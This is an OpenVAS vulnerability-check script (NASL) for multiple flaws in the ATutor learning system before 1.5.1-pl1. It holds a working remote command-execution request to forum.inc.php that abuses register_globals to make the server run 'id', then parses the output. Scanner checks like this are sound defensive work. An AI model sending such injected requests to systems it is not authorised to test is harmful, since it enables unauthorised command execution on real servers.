# OpenVAS Vulnerability Test
# $Id: atutor_multiple_flaws.nasl 17 2013-10-27 14:01:43Z jan $
# Description: ATutor < 1.5.1-pl1 Multiple Flaws
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP application that is prone to
multiple flaws. 

Description :

The remote host is running ATutor, an open-source web-based Learning
Content Management System (LCMS) written in PHP. 

The version of ATutor installed on the remote host may be vulnerable
to arbitrary command execution, arbitrary file access, and cross-site
scripting attacks.  Successful exploitation of the first two issues
requires that PHP's 'register_globals' setting be enabled and, in some
cases, that 'magic_quotes_gpc' be disabled.";

tag_solution = "Apply patch 1.5.1-pl1 or upgrade to version 1.5.2 or later.";

# Ref: Andreas Sandblad, Secunia Research

  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;
if(description)
{
  script_id(20095);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3403", "CVE-2005-3404", "CVE-2005-3405");
  script_bugtraq_id(15221);
  script_xref(name:"OSVDB", value:"20344");
  script_xref(name:"OSVDB", value:"20345");
  script_xref(name:"OSVDB", value:"20346");
  script_xref(name:"OSVDB", value:"20347");
  script_xref(name:"OSVDB", value:"20348");
  script_xref(name:"OSVDB", value:"20349");

  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("ATutor < 1.5.1-pl1 Multiple Flaws");

  script_description(desc);

  script_summary("Checks for remote arbitrary command in ATutor");
  script_category(ACT_GATHER_INFO);
  
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2005-55/advisory/");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


function check_dir(path)
{
  buf = http_get(item:string(path, "/login.php"), port:port);
  r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
  if( r == NULL )exit(0);
  if(egrep(pattern:"<meta name=.Generator. content=.ATutor - Copyright", string:r))
  {
    buf = http_get(item:string(path,"/include/html/forum.inc.php?addslashes=system&asc=id"), port:port);
    r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
    if( r == NULL )exit(0);

    # Isolate command output.
    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep(string:r, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        output = eregmatch(pattern:pat, string:match);
        if (!isnull(output)) {
          output = output[1];
          break;
        }
      }
    }

    # If that didn't work, perhaps just the system function is disabled.
    if (isnull(output)) {
      matches = egrep(pattern:"system\(\) has been disabled for security reasons", string:r);
      if (matches) {
        output = "";
        foreach match (split(matches)) {
          output += match;
        }
      }
    }

    if (output) {
      if (report_verbosity > 0) {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          output
        );
      }
      else report = desc;

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}

port = get_http_port(default:80);
if ( ! port ) exit(0);
if(!can_host_php(port:port)) exit(0);

foreach dir (cgi_dirs())
{
	check_dir(path:dir);
}

